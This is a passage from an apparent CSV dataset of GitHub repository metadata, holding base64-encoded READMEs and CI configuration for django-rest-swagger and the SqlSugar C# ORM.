name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
aXZlL3N1Y2Nlc3Nvci4gSSBoYXZlbid0IHBlcnNvbmFsbHkgdXNlZCBpdCwg
YnV0IGl0IGxvb2tzIGZlYXR1cmUtY29tcGxldGUgYW5kIGlzIGFjdGl2ZWx5
IG1haW50YWluZWQuCgojIyMgaHR0cHM6Ly9naXRodWIuY29tL2F4bnNhbjEy
L2RyZi15YXNnCgpUaGFua3MgZm9yIGFsbCB0aGUgc3VwcG9ydCBhbmQgY29u
dHJpYnV0aW9ucyBvdmVyIHRoZSB5ZWFycy4gU3BlY2lhbCB0aGFua3MgdG8g
W0xpZ2h0cyBvbiBTb2Z0d2FyZV0oaHR0cHM6Ly9saWdodHNvbnNvZnR3YXJl
LmNvbS8pLCBbTGluY29sbiBMb29wXShodHRwczovL2xpbmNvbG5sb29wLmNv
bS8pIGFuZCBCTk9USU9OUyBmb3IgZ2VuZXJvdXNseSBkb25hdGluZyB0aW1l
IHRvIHdvcmsgb24gdGhpcyBwcm9qZWN0IDpoZWFydDouCgotLS0KClshW2J1
aWxkLXN0YXR1cy1iYWRnZV1dW2J1aWxkLXN0YXR1c10KWyFbY29kZWNvdl0o
aHR0cHM6Ly9jb2RlY292LmlvL2doL21hcmNnaWJib25zL2RqYW5nby1yZXN0
LXN3YWdnZXIvYnJhbmNoL21hc3Rlci9ncmFwaC9iYWRnZS5zdmcpXShodHRw
czovL2NvZGVjb3YuaW8vZ2gvbWFyY2dpYmJvbnMvZGphbmdvLXJlc3Qtc3dh
Z2dlcikKWyFbcHlwaS12ZXJzaW9uXV1bcHlwaV0KCgpbIVtEZXBsb3ldKGh0
dHBzOi8vd3d3Lmhlcm9rdWNkbi5jb20vZGVwbG95L2J1dHRvbi5zdmcpXSho
dHRwczovL2hlcm9rdS5jb20vZGVwbG95KQoKCiMjIyMgQW4gQVBJIGRvY3Vt
ZW50YXRpb24gZ2VuZXJhdG9yIGZvciBTd2FnZ2VyIFVJIGFuZCBEamFuZ28g
UkVTVCBGcmFtZXdvcmsKCkZ1bGwgZG9jdW1lbnRhdGlvbjogaHR0cDovL21h
cmNnaWJib25zLmdpdGh1Yi5pby9kamFuZ28tcmVzdC1zd2FnZ2VyLwoKCiMj
IEluc3RhbGxhdGlvbgoKMS4gYHBpcCBpbnN0YWxsIGRqYW5nby1yZXN0LXN3
YWdnZXJgCgoyLiBBZGQgYHJlc3RfZnJhbWV3b3JrX3N3YWdnZXJgIHRvIHlv
dXIgYElOU1RBTExFRF9BUFBTYCBzZXR0aW5nOgoKICAgIGBgYHB5dGhvbgog
ICAgICAgIElOU1RBTExFRF9BUFBTID0gKAogICAgICAgICAgICAuLi4KICAg
ICAgICAgICAgJ3Jlc3RfZnJhbWV3b3JrX3N3YWdnZXInLAogICAgICAgICkK
ICAgIGBgYAoKIyMgUmVuZGVyaW5nIFN3YWdnZXIgU3BlY2lmaWNhdGlvbiBh
bmQgRG9jdW1lbnRhdGlvbgoKVGhpcyBwYWNrYWdlIHNoaXBzIHdpdGggdHdv
IHJlbmRlcmVyIGNsYXNzZXM6CgoxLiBgT3BlbkFQSVJlbmRlcmVyYCBnZW5l
cmF0ZXMgdGhlIE9wZW5BUEkgKGZrYSBTd2FnZ2VyKSBKU09OIHNjaGVtYSBz
cGVjaWZpY2F0aW9uLiBUaGlzIHJlbmRlcmVyIHdpbGwgYmUgcHJlc2VudGVk
IGlmOgogIC0gIGBDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29wZW5hcGkr
anNvbmAgaXMgc3BlY2lmaWVkIGluIHRoZSBoZWFkZXJzLgogIC0gYD9mb3Jt
YXQ9b3BlbmFwaWAgaXMgcGFzc2VkIGFzIHF1ZXJ5IHBhcmFtCjIuIGBTd2Fn
Z2VyVUlSZW5kZXJlcmAgZ2VuZXJhdGVzIHRoZSBTd2FnZ2VyIFVJIGFuZCBy
ZXF1aXJlcyB0aGUgYE9wZW5BUElSZW5kZXJlcmAKCgojIyMgUXVpY2sgU3Rh
cnQgRXhhbXBsZToKYGBgcHl0aG9uCmZyb20gZGphbmdvLmNvbmYudXJscyBp
bXBvcnQgdXJsCmZyb20gcmVzdF9mcmFtZXdvcmtfc3dhZ2dlci52aWV3cyBp
bXBvcnQgZ2V0X3N3YWdnZXJfdmlldwoKc2NoZW1hX3ZpZXcgPSBnZXRfc3dh
Z2dlcl92aWV3KHRpdGxlPSdQYXN0ZWJpbiBBUEknKQoKdXJscGF0dGVybnMg
PSBbCiAgICB1cmwocideJCcsIHNjaGVtYV92aWV3KQpdCmBgYAoKIyMgUmVx
dWlyZW1lbnRzCiogRGphbmdvIDEuOCsKKiBEamFuZ28gUkVTVCBmcmFtZXdv
cmsgMy41LjErCiogUHl0aG9uIDIuNywgMy41LCAzLjYKCgojIyBUZXN0aW5n
CgotIFJ1biBgJCB0b3hgIHRvIGV4ZWN1dGUgdGhlIHRlc3Qgc3VpdGUgYWdh
aW5zdCBhbGwgc3VwcG9ydGVkIGVudmlyb25tZW50cy4KLSBSdW4gYC4vcnVu
dGVzdHMucHlgIHRvIHJ1biB0aGUgdGVzdCBzdWl0ZSB3aXRoaW4gdGhlIGN1
cnJlbnQgZW52aXJvbm1lbnQuCgojIyBCdWdzICYgQ29udHJpYnV0aW9ucwpQ
bGVhc2UgcmVwb3J0IGJ1Z3MgYnkgb3BlbmluZyBhbiBpc3N1ZQoKQ29udHJp
YnV0aW9ucyBhcmUgd2VsY29tZSBhbmQgYXJlIGVuY291cmFnZWQhCgojIyBT
cGVjaWFsIFRoYW5rcwpNYW55IHRoYW5rcyB0byBUb20gQ2hyaXN0aWUgJiBh
bGwgdGhlIGNvbnRyaWJ1dG9ycyB3aG8gaGF2ZSBkZXZlbG9wZWQgW0RqYW5n
byBSRVNUIEZyYW1ld29ya10oaHR0cDovL2RqYW5nby1yZXN0LWZyYW1ld29y
ay5vcmcvKQoKCltidWlsZC1zdGF0dXMtYmFkZ2VdOiBodHRwczovL3RyYXZp
cy1jaS5vcmcvbWFyY2dpYmJvbnMvZGphbmdvLXJlc3Qtc3dhZ2dlci5zdmc/
YnJhbmNoPW1hc3RlcgpbYnVpbGQtc3RhdHVzXTogaHR0cHM6Ly90cmF2aXMt
Y2kub3JnL21hcmNnaWJib25zL2RqYW5nby1yZXN0LXN3YWdnZXIKW3B5cGkt
dmVyc2lvbl06IGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vcHlwaS92L2RqYW5n
by1yZXN0LXN3YWdnZXIuc3ZnCltweXBpXTogaHR0cHM6Ly9weXBpLnB5dGhv
bi5vcmcvcHlwaS9kamFuZ28tcmVzdC1zd2FnZ2VyCltsaWNlbnNlXTogaHR0
cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9kamFuZ28tcmVzdC1zd2FnZ2Vy
LwpbZG9jcy1iYWRnZV06IGh0dHBzOi8vcmVhZHRoZWRvY3MuaW8vcHJvamVj
dHMvZGphbmdvLXJlc3Qtc3dhZ2dlci9iYWRnZS8KW2RvY3NdOiBodHRwOi8v
ZGphbmdvLXJlc3Qtc3dhZ2dlci5yZWFkdGhlZG9jcy5pby8K
",,"bGFuZ3VhZ2U6IHB5dGhvbgpweXRob246CiAgLSAiMy42IgogIC0gIjIuNyIK
c3VkbzogZmFsc2UKbWF0cml4OgogIGZhc3RfZmluaXNoOiB0cnVlCmluc3Rh
bGw6CiAgLSBwaXAgaW5zdGFsbCB0b3ggdG94LXRyYXZpcyBjb2RlY292CnNj
cmlwdDoKICAtIHRveAphZnRlcl9zdWNjZXNzOgogIGNvZGVjb3YKCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'SqlSugar',38992233,b'Best ORM    Fastest ORM   Simple Easy  Sqlite  orm Oracle ORM Mysql Orm  postgresql ORm  SqlServer oRm     ',b'C#',119,2393,,2393,False,b'https://api.github.com/repos/sunkaixuan/SqlSugar/forks',"IyBTcWxTdWdhciA1LlggIEFQSSAKClVzaW5nIFNxbFN1Z2FyIGlzIHZlcnkg
c2ltcGxlICxBbmQgaXQncyBwb3dlcmZ1bC4KClNxbFN1Z2FyPU9uZSBvYmpl
Y3QrT25lIHBhcmFtZXRlcj0xNiBmdW5jdGlvbnMsCgpTdXBwb3J077yaTXlT
cWzjgIFTcWxTZXJ2ZXLjgIFTcWxpdGXjgIFPcmFjbGUg44CBIHBvc3RncmVz
cWwgCiMjIENvbnRhY3RpbmZvbWF0aW9uICAKRW1haWw6NjEwMjYyMzc0QHFx
LmNvbSAKUVEgR3JvdXA6MjI1OTgyOTg1CgojIyBOdWdldCAKCnwubmV0IHwu
bmV0IGNvcmUgfAp8LS0tLS0tLS0tfCAtLS0tLS0tLS18CnxJbnN0YWxsLVBh
Y2thZ2Ugc3FsU3VnYXIgfEluc3RhbGwtUGFja2FnZSBzcWxTdWdhckNvcmV8
CiAKIyMgU3FsU3VnYXIncyAxNiBGdW5jdGlvbnMKVGhlcmUgYXJlIDE2IG1l
dGhvZHMgdW5kZXIgU3FsU3VnYXJDbGllbnQKIVvovpPlhaXlm77niYfor7Tm
mI5dKGh0dHA6Ly93d3cuY29kZWlzYnVnLmNvbS9fdGhlbWUvdWVkaXRvci91
dGY4LW5ldC9uZXQvdXBsb2FkL2ltYWdlLzIwMTkwNDMwLzYzNjkyMjQwNTY0
OTk4MDI2NzQ3ODI5NTcuanBnP2lkPTExICJzcWxzdWdhciIpCiAKIAoKIyMg
Q3JlYXRlIFNxbFN1Z2FyQ2xpZW50CkFsbCBvcGVyYXRpb25zIGFyZSBiYXNl
ZCBvbiBTcWxTdWdhckNsaWVudAoKU3FsU3VnYXJDbGllbnQgcGFyYW1ldGVy
IGFuZCBvbmx5IG9uZSBDb25uZWN0aW9uQ29uZmlnCmBgYGNzCnB1YmxpYyAg
TGlzdDxTdHVkZW50PiBHZXRTdHVkZW50TGlzdCgpCnsKICAgIHZhciBkYj0g
R2V0SW5zdGFuY2UoKTsKICAgIHZhciBsaXN0PSBkYi5RdWVyeWFibGU8U3R1
ZGVudD4oKS5Ub0xpc3QoKTsvL1NlYXJjaAogICAgcmV0dXJuIGxpc3Q7Cn0K
Ci8vLyA8c3VtbWFyeT4KLy8vIENyZWF0ZSBTcWxTdWdhckNsaWVudAovLy8g
PC9zdW1tYXJ5PgovLy8gPHJldHVybnM+PC9yZXR1cm5zPgpwcml2YXRlIFNx
bFN1Z2FyQ2xpZW50IEdldEluc3RhbmNlKCkKewogICAgU3FsU3VnYXJDbGll
bnQgZGIgPSBuZXcgU3FsU3VnYXJDbGllbnQobmV3IENvbm5lY3Rpb25Db25m
aWcoKQogICAgICAgIHsKICAgICAgICAgICAgQ29ubmVjdGlvblN0cmluZyA9
ICJTZXJ2ZXI9Lnh4eHh4IiwKICAgICAgICAgICAgRGJUeXBlID0gRGJUeXBl
LlNxbFNlcnZlciwKICAgICAgICAgICAgSXNBdXRvQ2xvc2VDb25uZWN0aW9u
ID0gdHJ1ZSwKICAgICAgICAgICAgSW5pdEtleVR5cGUgPSBJbml0S2V5VHlw
ZS5BdHRyaWJ1dGUKICAgICAgICB9KTsKICAgIC8vUHJpbnQgc3FsCiAgICBk
Yi5Bb3AuT25Mb2dFeGVjdXRpbmcgPSAoc3FsLCBwYXJzKSA9PgogICAgewog
ICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKHNxbCArICJcclxuIiArIGRiLlV0
aWxpdGllcy5TZXJpYWxpemVPYmplY3QocGFycy5Ub0RpY3Rpb25hcnkoaXQg
PT4gaXQuUGFyYW1ldGVyTmFtZSwgaXQgPT4gaXQuVmFsdWUpKSk7CiAgICAg
ICAgQ29uc29sZS5Xcml0ZUxpbmUoKTsKICAgIH07CiAgICByZXR1cm4gZGI7
Cn0KCnB1YmxpYyBjbGFzcyBTdHVkZW50CnsKICAgIFtTdWdhckNvbHVtbihJ
c1ByaW1hcnlLZXkgPSB0cnVlLCBJc0lkZW50aXR5ID0gdHJ1ZV0KICAgIHB1
YmxpYyBpbnQgSWQgeyBnZXQ7IHNldDsgfQogICAgcHVibGljIGludD8gU2No
b29sSWQgeyBnZXQ7IHNldDsgfQogICAgcHVibGljIHN0cmluZyBOYW1lIHsg
Z2V0OyBzZXQ7IH0KfQpgYGAKICBbPGZvbnQgY29sb3I9cmVkPlZpZXcgbW9y
ZSA+PiA8L2ZvbnQ+XShodHRwczovL2dpdGh1Yi5jb20vc3Vua2FpeHVhbi9T
cWxTdWdhci93aWtpLzAuU3FsU3VnYXJDbGllbnQpIAogCgojIyAgMS4gUXVl
cnlhYmxlCldlIHVzZSBpdCB0byBxdWVyeQogIVvovpPlhaXlm77niYfor7Tm
mI5dKGh0dHA6Ly93d3cuY29kZWlzYnVnLmNvbS9fdGhlbWUvdWVkaXRvci91
dGY4LW5ldC9uZXQvdXBsb2FkL2ltYWdlLzIwMTkwNTAyLzYzNjkyNDA5MzI5
OTczNjMwMzUxOTc0NTkucG5nP2lkPTEgIlF1ZXJ5YWJsZSIpCiAKIyMjIyMg
SGVyZSBhcmUgc29tZSBleGFtcGxlcwpgYGBjcwovL2Vhc3kKdmFyIGdldEFs
bCA9IGRiLlF1ZXJ5YWJsZTxTdHVkZW50PigpLlRvTGlzdCgpOwp2YXIgZ2V0
QWxsTm9Mb2NrID0gZGIuUXVlcnlhYmxlPFN0dWRlbnQ+KCkuV2l0aChTcWxX
aXRoLk5vTG9jaykuVG9MaXN0KCk7CnZhciBnZXRCeVByaW1hcnlLZXkgPSBk
Yi5RdWVyeWFibGU8U3R1ZGVudD4oKS5JblNpbmdsZSgyKTsKdmFyIHN1bSA9
IGRiLlF1ZXJ5YWJsZTxTdHVkZW50PigpLlN1bShpdD0+aXQuSWQpOwp2YXIg
aXNBbnkgPSBkYi5RdWVyeWFibGU8U3R1ZGVudD4oKS5XaGVyZShpdD0+aXQu
SWQ9PS0xKS5BbnkoKTsKdmFyIGlzQW55MiA9IGRiLlF1ZXJ5YWJsZTxTdHVk
ZW50PigpLkFueShpdCA9PiBpdC5JZCA9PSAtMSk7CnZhciBnZXRMaXN0QnlS
ZW5hbWUgPSBkYi5RdWVyeWFibGU8U2Nob29sPigpLkFTKCJTdHVkZW50Iiku
VG9MaXN0KCk7CnZhciBnZXRCeVdoZXJlID0gZGIuUXVlcnlhYmxlPFN0dWRl
bnQ+KCkuV2hlcmUoaXQgPT4gaXQuSWQgPT0gMSB8fCBpdC5OYW1lID09ICJh
IikuVG9MaXN0KCk7CnZhciBnZXRCeUZ1bnMgPSBkYi5RdWVyeWFibGU8U3R1
ZGVudD4oKS5XaGVyZShpdCA9PiBTcWxGdW5jLklzTnVsbE9yRW1wdHkoaXQu
TmFtZSkpLlRvTGlzdCgpOwp2YXIgZ3JvdXAgPSBkYi5RdWVyeWFibGU8U3R1
ZGVudD4oKS5Hcm91cEJ5KGl0ID0+IGl0LklkKS5TZWxlY3QoaXQgPT5uZXcg
eyBpZCA9IFNxbEZ1bmMuQWdncmVnYXRlQ291bnQoaXQuSWQpIH0pLlRvTGlz
dCgpOwoKLy9QYWdlCnZhciBwYWdlID0gZGIuUXVlcnlhYmxlPFN0dWRlbnQ+
KCkuVG9QYWdlTGlzdChwYWdlSW5kZXgsIHBhZ2VTaXplLCByZWYgdG90YWxD
b3VudCk7CgovL3BhZ2Ugam9pbgp2YXIgcGFnZUpvaW4gPSBkYi5RdWVyeWFi
bGU8U3R1ZGVudCwgU2Nob29sPigoc3QsIHNjKSA9Pm5ldyBKb2luUXVlcnlJ
bmZvcyhKb2luVHlwZS5MZWZ0LHN0LlNjaG9vbElkPT1zYy5JZCkpCi5Ub1Bh
Z2VMaXN0KHBhZ2VJbmRleCwgcGFnZVNpemUsIHJlZiB0b3RhbENvdW50KTsK
Ci8vdG9wIDUKdmFyIHRvcDUgPSBkYi5RdWVyeWFibGU8U3R1ZGVudD4oKS5U
YWtlKDUpLlRvTGlzdCgpOwoKLy9qb2luIE9yZGVyIEJ5IChvcmRlciBieSBz
dC5pZCBkZXNjLHNjLmlkIGRlc2MpCnZhciBsaXN0NCA9IGRiLlF1ZXJ5YWJs
ZTxTdHVkZW50LCBTY2hvb2w+KChzdCwgc2MpID0+bmV3ICBKb2luUXVlcnlJ
bmZvcyhKb2luVHlwZS5MZWZ0LHN0LlNjaG9vbElkPT1zYy5JZCkpCi5PcmRl
ckJ5KHN0PT5zdC5JZCxPcmRlckJ5VHlwZS5EZXNjKQouT3JkZXJCeSgoc3Qs
c2MpPT5zYy5JZCxPcmRlckJ5VHlwZS5EZXNjKQouU2VsZWN0PFZpZXdNb2Rl
bFN0dWRlbnQ+KCkuVG9MaXN0KCk7CgpgYGAKWzxmb250IGNvbG9yPXJlZD5W
aWV3IG1vcmUgPj4gPC9mb250Pl0oaHR0cHM6Ly9naXRodWIuY29tL3N1bmth
aXh1YW4vU3FsU3VnYXIvd2lraS8xLlF1ZXJ5YWJsZSkgCiAKCgogIyMgIDIu
IFVwZGF0ZWFibGUKV2UgdXNlIGl0IHRvIFVwZGF0ZQogYGBgY3MKLy91cGRh
dGUgcmV1dHJuIFVwZGF0ZSBDb3VudAp2YXIgdDE9IGRiLlVwZGF0ZWFibGUo
dXBkYXRlT2JqKS5FeGVjdXRlQ29tbWFuZCgpOwoKLy9Pbmx5ICB1cGRhdGUg
IE5hbWUgCnZhciB0MyA9IGRiLlVwZGF0ZWFibGUodXBkYXRlT2JqKS5VcGRh
dGVDb2x1bW5zKGl0ID0+IG5ldyB7IGl0Lk5hbWUgfSkuRXhlY3V0ZUNvbW1h
bmQoKTsKCi8vSWdub3JlICBOYW1lIGFuZCBUZXN0SWQKdmFyIHQ0ID0gZGIu
VXBkYXRlYWJsZSh1cGRhdGVPYmopLklnbm9yZUNvbHVtbnMoaXQgPT4gbmV3
IHsgaXQuTmFtZSwgaXQuVGVzdElkIH0pLkV4ZWN1dGVDb21tYW5kKCk7Cgov
L3VwZGF0ZSBMaXN0PFQ+CnZhciB0NyA9IGRiLlVwZGF0ZWFibGUodXBkYXRl
T2JqcykuRXhlY3V0ZUNvbW1hbmQoKTsKCi8vV2hlcmUgQnkgRXhwcmVzc2lv
bgp2YXIgdDkgPSBkYi5VcGRhdGVhYmxlKGl0PT5uZXcgY2xhc3MoKSB7IG5h
bWU9ImEiLGNyZWF0ZXRpbWU9cCB9KS5XaGVyZShpdCA9PiBpdC5JZCA9PSAx
KS5FeGVjdXRlQ29tbWFuZCgpOwoKIGBgYAogWzxmb250IGNvbG9yPXJlZD5W
aWV3IG1vcmUgPj4gPC9mb250Pl0oaHR0cHM6Ly9naXRodWIuY29tL3N1bmth
aXh1YW4vU3FsU3VnYXIvd2lraS8yLlVwZGF0ZWFibGUpIAoKIAojIyAgMy4g
SW5zZXJ0YWJsZQpXZSB1c2UgaXQgdG8gSW5zZXJ0CiBgYGBjcwovL0luc2Vy
dCByZXV0cm4gSW5zZXJ0IENvdW50CnZhciB0MiA9IGRiLkluc2VydGFibGUo
aW5zZXJ0T2JqKS5FeGVjdXRlQ29tbWFuZCgpOwoKLy9JbnNlcnQgcmV1dHJu
IElkZW50aXR5IFZhbHVlCnZhciB0MyA9IGRiLkluc2VydGFibGUoaW5zZXJ0
T2JqKS5FeGVjdXRlUmV1dHJuSWRlbnRpdHkoKTsKCi8vT25seSAgaW5zZXJ0
ICBOYW1lIAp2YXIgdDQgPSBkYi5JbnNlcnRhYmxlKGluc2VydE9iaikuSW5z
ZXJ0Q29sdW1ucyhpdCA9PiBuZXcgeyBpdC5OYW1lLGl0LlNjaG9vbElkIH0p
LkV4ZWN1dGVSZXV0cm5JZGVudGl0eSgpOwoKLy9JZ25vcmUgVGVzdElkCnZh
ciB0NSA9IGRiLkluc2VydGFibGUoaW5zZXJ0T2JqKS5JZ25vcmVDb2x1bW5z
KGl0ID0+IG5ldyB7IGl0Lk5hbWUsIGl0LlRlc3RJZCB9KS5FeGVjdXRlUmV1
dHJuSWRlbnRpdHkoKTsKCi8vSW5zZXJ0IExpc3Q8VD4KdmFyIHM5ID0gZGIu
SW5zZXJ0YWJsZShpbnNlcnRPYmpzKS5JbnNlcnRDb2x1bW5zKGl0ID0+IG5l
dyB7IGl0Lk5hbWUgfSkuRXhlY3V0ZUNvbW1hbmQoKTsKYGBgCiBbPGZvbnQg
Y29sb3I9cmVkPlZpZXcgbW9yZSA+PiA8L2ZvbnQ+XShodHRwczovL2dpdGh1
Yi5jb20vc3Vua2FpeHVhbi9TcWxTdWdhci93aWtpLzMuSW5zZXJ0YWJsZSkg
CiAKIyMgIDQuIERlbGV0ZWFibGUKV2UgdXNlIGl0IHRvIERlbGV0ZQoKIGBg
YGNzCiAvL2J5IGVudGl0eQpkYi5EZWxldGVhYmxlPFN0dWRlbnQ+KCkuV2hl
cmUobmV3IFN0dWRlbnQoKSB7IElkID0gMSB9KS5FeGVjdXRlQ29tbWFuZCgp
OwoKLy9ieSBwcmltYXJ5IGtleQpkYi5EZWxldGVhYmxlPFN0dWRlbnQ+KCku
SW4oMSkuRXhlY3V0ZUNvbW1hbmQoKTsKCi8vYnkgcHJpbWFyeSBrZXkgYXJy
YXkKZGIuRGVsZXRlYWJsZTxTdHVkZW50PigpLkluKG5ldyBpbnRbXSB7IDEs
IDIgfSkuRXhlY3V0ZUNvbW1hbmQoKTsKCi8vYnkgZXhwcmVzc2lvbgpkYi5E
ZWxldGVhYmxlPFN0dWRlbnQ+KCkuV2hlcmUoaXQgPT4gaXQuSWQgPT0gMSku
RXhlY3V0ZUNvbW1hbmQoKTsKCiBgYGAKIFs8Zm9udCBjb2xvcj1yZWQ+Vmll
dyBtb3JlID4+IDwvZm9udD5dKGh0dHBzOi8vZ2l0aHViLmNvbS9zdW5rYWl4
dWFuL1NxbFN1Z2FyL3dpa2kvNC5EZWxldGVhYmxlICkgCgoKICMjICA1LiBT
cWxRdWVyeWFibGUKYGBgY3MKdmFyIGxpc3QgPSBkYi5TcWxRdWVyeWFibGU8
U3R1ZGVudD4oInNlbGVjdCAqIGZyb20gc3R1ZGVudCIpLlRvUGFnZUxpc3Qo
MSwgMik7CnZhciBsaXN0MiA9IGRiLlNxbFF1ZXJ5YWJsZTxTdHVkZW50Pigi
c2VsZWN0ICogZnJvbSBzdHVkZW50IikuV2hlcmUoaXQ9Pml0LklkPT0xKS5U
b1BhZ2VMaXN0KDEsIDIpOwp2YXIgbGlzdDM9IGRiLlNxbFF1ZXJ5YWJsZTxT
dHVkZW50Pigic2VsZWN0ICogZnJvbSBzdHVkZW50IikuV2hlcmUoImlkPUBp
ZCIsbmV3IHsgaWQ9MX0pLlRvUGFnZUxpc3QoMSwgMik7CmBgYCAKWzxmb250
IGNvbG9yPXJlZD5WaWV3IG1vcmUgPj4gPC9mb250Pl0oaHR0cHM6Ly9naXRo
dWIuY29tL3N1bmthaXh1YW4vU3FsU3VnYXIvd2lraS81LlNxbFF1ZXJ5YWJs
ZSApIAogCiAgIyMgIDYuIFNhdmVRdWV1ZXMKICBQZXJmb3JtIG11bHRpcGxl
IG9wZXJhdGlvbnMgdG9nZXRoZXIgd2l0aCB0cmFuc2FjdGlvbnMKYGBgY3MK
dmFyIGRiID0gR2V0SW5zdGFuY2UoKTsKZGIuSW5zZXJ0YWJsZTxTdHVkZW50
PihuZXcgU3R1ZGVudCgpIHsgTmFtZSA9ICJhIiB9KS5BZGRRdWV1ZSgpOwpk
Yi5JbnNlcnRhYmxlPFN0dWRlbnQ+KG5ldyBTdHVkZW50KCkgeyBOYW1lID0g
ImIiIH0pLkFkZFF1ZXVlKCk7CmRiLlNhdmVRdWV1ZXMoKTsgCgpkYi5JbnNl
cnRhYmxlPFN0dWRlbnQ+KG5ldyBTdHVkZW50KCkgeyBOYW1lID0gImEiIH0p
LkFkZFF1ZXVlKCk7CmRiLkluc2VydGFibGU8U3R1ZGVudD4obmV3IFN0dWRl
bnQoKSB7IE5hbWUgPSAiYiIgfSkuQWRkUXVldWUoKTsKZGIuSW5zZXJ0YWJs
ZTxTdHVkZW50PihuZXcgU3R1ZGVudCgpIHsgTmFtZSA9ICJjIiB9KS5BZGRR
dWV1ZSgpOwpkYi5JbnNlcnRhYmxlPFN0dWRlbnQ+KG5ldyBTdHVkZW50KCkg
eyBOYW1lID0gImQiIH0pLkFkZFF1ZXVlKCk7CnZhciBhciA9IGRiLlNhdmVR
dWV1ZXNBc3luYygpOyAKCmRiLlF1ZXJ5YWJsZTxTdHVkZW50PigpLkFkZFF1
ZXVlKCk7CmRiLlF1ZXJ5YWJsZTxTY2hvb2w+KCkuQWRkUXVldWUoKTsKZGIu
QWRkUXVldWUoInNlbGVjdCAqIGZyb20gc3R1ZGVudCB3aGVyZSBpZD1AaWQi
LCBuZXcgeyBpZCA9IDEgfSk7IAp2YXIgcmVzdWx0MiA9IGRiLlNhdmVRdWV1
ZXM8U3R1ZGVudCwgU2Nob29sLCBTdHVkZW50PigpOyAgCmBgYApbPGZvbnQg
Y29sb3I9cmVkPlZpZXcgbW9yZSA+PiA8L2ZvbnQ+XShodHRwczovL2dpdGh1
Yi5jb20vc3Vua2FpeHVhbi9TcWxTdWdhci93aWtpLzYucXVldWUgKSAKCgoj
IyAgNy5BZG8KZGIuQWRvLk1ldGhvZE5hbWXvvIxMb29rIGF0IHRoZSBmb2xs
b3dpbmcgZXhhbXBsZQpgYGBjcwp2YXIgZHQ9ZGIuQWRvLkdldERhdGFUYWJs
ZSgic2VsZWN0ICogZnJvbSB0YWJsZSB3aGVyZSBpZD1AaWQgYW5kIG5hbWU9
QG5hbWUiLG5ldyBMaXN0PFN1Z2FyUGFyYW1ldGVyPigpewogIG5ldyBTdWdh
clBhcmFtZXRlcigiQGlkIiwxKSwKICBuZXcgU3VnYXJQYXJhbWV0ZXIoIkBu
YW1lIiwyKQp9KTsKdmFyIGR0PWRiLkFkby5HZXREYXRhVGFibGUoInNlbGVj
dCAqIGZyb20gdGFibGUgd2hlcmUgaWQ9QGlkIGFuZCBuYW1lPUBuYW1lIixu
ZXd7aWQ9MSxuYW1lPTJ9KTsKCi8vVXNlIFN0b3JlZCBQcm9jZWR1cmUKdmFy
IGR0MiA9IGRiLkFkby5Vc2VTdG9yZWRQcm9jZWR1cmUoKS5HZXREYXRhVGFi
bGUoInNwX3NjaG9vbCIsbmV3e25hbWU9IuW8oOS4iSIsYWdlPTB9KTsvLyAg
